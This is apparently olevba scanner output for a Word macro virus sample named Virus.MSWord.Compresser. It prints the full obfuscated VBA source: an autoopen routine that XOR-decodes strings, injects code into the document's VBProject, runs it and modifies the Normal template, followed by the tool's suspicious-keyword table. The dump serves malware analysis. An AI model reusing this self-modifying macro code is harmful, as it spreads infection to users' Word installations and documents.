olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Compresser-55447f9ad94e18e887cda992212a517bcd3f13f9
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Compresser-55447f9ad94e18e887cda992212a517bcd3f13f9 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ThisDocument1.cls 
in file: Virus.MSWord.Compresser-55447f9ad94e18e887cda992212a517bcd3f13f9 - OLE stream: 'Macros/VBA/ThisDocument1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub autoopen()
Dim j(100) As String
j(0) = "ÄĄĂĄ¸ĄÇÍ"
j(1) = "ÄĄÂĄ¸ĄĆÍ"
j(2) = "ÄĄŔĄ¸ĄÁÍ"
j(3) = "čüćęáŕĄ¸ĄŔČ­´©ĄŔÉ¬"
j(4) = "ÝĄĘ"
j(5) = "ŐĄ¸Ą­´¨´¬"
j(6) = "ÔĄ¸Ą­´¨´¬"
j(7) = "×Ą¸Ą­´¨´¬"
j(8) = "ËÖĄ¸ĄŃ"
j(9) = "ËĐĄ¸Ą­´¨´¬"
j(10) = "ËÓĄ¸Ą­´¨´¬"
j(11) = "ËŇĄ¸Ą­´¨´¬"
j(12) = "Ü"
j(13) = "ÝĄĂ"
j(14) = "ĎĄ´©ĄÉ"
j(15) = "ĚĄčüćęáŕ"
j(16) = "Ü"
j(17) = "ÝĄÂ"
j(18) = "ĎĄ´©ĄÉ"
j(19) = "ĚĄčüćęáŕ"
j(20) = "Ü"
j(21) = "Ć«öäóŕäöĄĆß"
Set This = ThisDocument: Set VBP = This.VBProject
Set VBC = VBP.VBCOMPONENTS(1): Set COD = VBC.CODEMODULE
For I = 0 To 21
decode = decode & Dec(Decrypt(j(I))) & vbCr
Next
COD.InsertLines 79, decode
Call compressed
NormalTemplate.VBProject.VBCOMPONENTS(1).CODEMODULE.DELETELINES 79, 23
ActiveDocument.VBProject.VBCOMPONENTS(1).CODEMODULE.DELETELINES 79, 23
Rem WM97.COMPRESSED
End Sub
Private Function Dec(s)
H1 = "": D = ""
For I = 1 To Len(s)
H1 = Mid(s, I, 1)
Select Case H1
Case "A": H1 = Decrypt("ÖŔŃ")
Case "B": H1 = Decrypt("ËĘ×ČÄÉŃŔČŐÉÄŃŔ")
Case "C": H1 = Decrypt("ÄĆŃĚÓŔÁĘĆĐČŔËŃ")
Case "D": H1 = Decrypt("ŃÍĚÖÁĘĆĐČŔËŃ")
Case "E": H1 = Decrypt("ŃÍÖ")
Case "F": H1 = Decrypt("ËĘ×")
Case "G": H1 = Decrypt("ÁĘĆ")
Case "H": H1 = Decrypt("«ÓÇŐ×ĘĎŔĆŃ«ÓÇĆĘČŐĘËŔËŃÖ­´¬«ĆĘÁŔČĘÁĐÉŔ")
Case "I": H1 = Decrypt("«ÄÁÁĂ×ĘČÖŃ×ĚËÂ")
Case "J": H1 = Decrypt("«ÁŔÉŔŃŔÉĚËŔÖ")
Case "K": H1 = Decrypt("«ĚËÖŔ×ŃÉĚËŔÖ")
Case "L": H1 = Decrypt("«ĆĘĐËŃĘĂÉĚËŔÖ")
Case "M": H1 = Decrypt("«ÉĚËŔÖ")
Case "N": H1 = Decrypt("«ÄŐŐÉĚĆÄŃĚĘË")
Case "O": H1 = Decrypt("ĘŐŃĚĘËÖ")
Case "P": H1 = Decrypt("«ÓĚ×ĐÖŐ×ĘŃŔĆŃĚĘË")
Case "Q": H1 = Decrypt("«ÖÄÓŔËĘ×ČÄÉŐ×ĘČŐŃ")
Case "R": H1 = Decrypt("«ĆĘËĂĚ×ČĆĘËÓŔ×ÖĚĘËÖ")
Case "S": H1 = Decrypt("«ÁĚÖŐÉÄÜÄÉŔ×ŃÖ")
Case "T": H1 = Decrypt("ŇÁÄÉŔ×ŃÖËĘËŔ")
Case "U": H1 = Decrypt("«ÖĆ×ŔŔËĐŐÁÄŃĚËÂ")
Case "V": H1 = Decrypt("«ÁĚÖŐÉÄÜÖŃÄŃĐÖÇÄ×")
Case "W": H1 = Decrypt("«ŔËÄÇÉŔĆÄËĆŔÉÎŔÜ")
Case "X": H1 = Decrypt("ŇĚŃÍ")
Case "Y": H1 = Decrypt("ŔËÁĄŇĚŃÍ")
Case "Z": H1 = Decrypt("«ĂĐÉÉËÄČŔ")
End Select
D = D & H1
Next
Dec = D
End Function
Private Function Decrypt(s)
For I = 1 To Len(s)
Decrypt = Decrypt & Chr(Asc(Mid(s, I, 1)) Xor 133)
Next
End Function

Private Sub compressed()

End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoopen            |Runs when the Word document is opened        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBCOMPONENTS        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CODEMODULE          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

